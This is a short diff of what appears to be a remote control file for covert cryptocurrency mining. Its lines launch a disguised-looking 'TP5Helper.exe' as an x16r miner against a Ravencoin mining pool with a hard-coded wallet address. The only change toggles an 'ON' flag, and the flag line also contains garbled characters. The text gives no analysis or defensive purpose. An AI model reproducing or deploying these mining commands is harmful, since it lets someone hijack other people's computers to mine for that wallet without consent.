@@ -15,7 +15,7 @@ A4A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u R9PV
 A5A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u R9PV5WwFP22m8yu1fVdTJr6KwcAcnkQxER.1014@pplns -i 14 -p x--A5A
 A6A--\TP5Helper.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u R9PV5WwFP22m8yu1fVdTJr6KwcAcnkQxER.1015@pplns -i 15 -p x--A6A
 A9A--ON--A9A
-GITON2--ON2--GITON2  00弄           弄16 17ok
+GITON2--ON2111--GITON2  00弄           弄16 17ok
 ------------------------------------------------------------------------------------------------------------------------------------
 XZ--ON1--XZ
 ------------------------------------------------------------------------------------------------------------------------------------
